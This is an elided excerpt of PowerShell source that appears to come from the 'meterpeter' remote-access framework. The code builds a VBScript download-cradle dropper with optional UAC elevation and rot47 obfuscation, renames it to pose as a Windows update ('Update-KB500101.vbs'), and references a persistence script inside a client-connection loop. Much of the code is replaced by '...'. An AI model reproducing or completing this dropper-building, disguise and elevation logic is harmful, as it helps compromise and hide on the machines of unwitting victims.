  ...
  If($Python_version)
  {
    ...
    ElseIf($FlavorSellection -eq 4)
    {
       ...
       If(-not(Test-Path -Path "$IPATH\Download_Crandle.vbs" -EA SilentlyContinue))
       {
          ...
          # TODO: update 'crandle_builder' + 'meterpeter.ps1' with FileLess technic on GitHub
       ...
       If($RunEXElevated -iMatch '^(y|yes)$')
       {
          ...
          powershell -file crandle_builder.ps1 -action "$fuckOrNot" -VbsName "Download_Crandle.vbs" -UACElevation 'true' -Egg 'true'|Out-Null
       }
       Else
       {
          powershell -file crandle_builder.ps1 -action "$fuckOrNot" -VbsName "Download_Crandle.vbs" -UACElevation 'false' -Egg 'true'|Out-Null
       }
       ...
       #iwr -uri https://raw.githubusercontent.com/DoctorLai/VBScript_Obfuscator/master/vbs_rot47_obfuscator.vbs -outfile vbs_rot47_obfuscator.vbs|Unblock-File

       #Obfuscate Program.vbs sourcecode.
       #cscript.exe vbs_rot47_obfuscator.vbs Download_Crandle.vbs > Buffer.vbs

       #Parse data
       $CrandleVbsName = "${Dropper_Name}" + ".vbs" -Join '' # Update-KB500101.vbs
       Move-Item Download_Crandle.vbs $CrandleVbsName -force
...
While($Client.Connected)
{
  ...
  #Stop wscript.exe (persistence.VBS script) if its running..
  #If((Get-Process -Name Wscript.exe -ErrorAction SilentlyContinue).Responding -ieq "True")
  #{
  #   Stop-Process -Name Wscript.exe -Force
  #}
